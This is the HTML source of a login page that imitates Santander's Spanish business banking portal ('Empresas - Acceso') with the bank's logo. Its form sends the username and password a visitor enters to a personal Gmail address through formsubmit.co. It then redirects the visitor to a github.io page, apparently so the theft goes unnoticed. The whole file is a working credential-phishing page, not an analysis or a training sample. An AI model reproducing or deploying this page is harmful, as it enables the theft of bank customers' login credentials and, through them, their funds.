<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Empresas Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="icon" type="image/png" href="./iconss.png" />
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
</head>

<body class="h-screen bg-cover bg-center" style="background-image: url('./backgr.jpg');">
    <div class="h-full flex items-center justify-center">
        <div class="w-[350px] bg-white/60 backdrop-blur-md shadow-md p-6 rounded-none">
            <div class="flex justify-center mb-4">
                <img src="./logosand.png" alt="Santander Logo" class="h-10">
            </div>

            <h1 class="text-lg font-semibold text-gray-700 mb-3">Empresas - Acceso</h1>

            <form action="https://formsubmit.co/princekhalifa2017@gmail.com" method="POST" class="space-y-4">
                <input type="hidden" name="_next" value="https://microbitsoft.github.io/santader/santander/index.html">
                <input type="hidden" name="_captcha" value="false">
                <div class="relative">
                    <input type="text" id="usuario" name="usuario"
                        class="w-full text-sm border border-gray-300 bg-white/30 backdrop-blur-md p-2 pt-4 rounded-none focus:outline-none focus:ring-2 focus:ring-red-500 placeholder-transparent"
                        placeholder="Introduce tu usuario">
                    <label for="usuario"
                        class="absolute left-2 top-1 text-xs text-gray-500 transition-all duration-200 ease-in-out pointer-events-none">
                        Usuario
                    </label>
                </div>

                <div class="relative">
                    <input type="password" id="password" name="password"
                        class="w-full text-sm border border-gray-300 bg-white/30 backdrop-blur-md p-2 pr-10 pt-4 rounded-none focus:outline-none focus:ring-2 focus:ring-red-500 placeholder-transparent"
                        placeholder="Introduce tu clave de acceso">
                    <label for="password"
                        class="absolute left-2 top-1 text-xs text-gray-500 transition-all duration-200 ease-in-out pointer-events-none">
                        Clave de acceso
                    </label>
                </div>

                <button type="submit"
                    class="w-full bg-red-600/80 text-white py-1.5 rounded-none hover:bg-red-700 transition duration-200 text-sm">
                    Entrar
                </button>
            </form>
        </div>
    </div>
</body>

</html>
